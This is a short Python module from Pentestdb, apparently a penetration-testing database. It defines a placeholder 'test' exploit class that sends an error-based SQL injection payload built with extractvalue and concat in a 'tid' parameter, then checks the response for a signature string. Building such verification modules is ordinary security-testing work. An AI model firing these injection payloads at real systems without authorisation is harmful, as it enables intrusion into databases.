#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.libs.exploit import Exploit, Result


class TestExp(Exploit):
    expName = u"test"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "test"
    appVersion = "6.x 7.x"
    reference = ['test.com']
    description = u'''
        test
    '''

    def _verify(self):
        result = Result(self)

        sig = '5201314520'
        payload = "extractvalue(1,concat(0x5c,(select {0})))".format(sig)
        
        self.params['tid'] = payload

        response = self.http.get(self.baseURL, params=self.params, allow_redirects=False)
        
        if response.status_code == 200:
            if sig in response.content:
                result['fullpath'] = self.url
                result['payload'] = payload

        return result
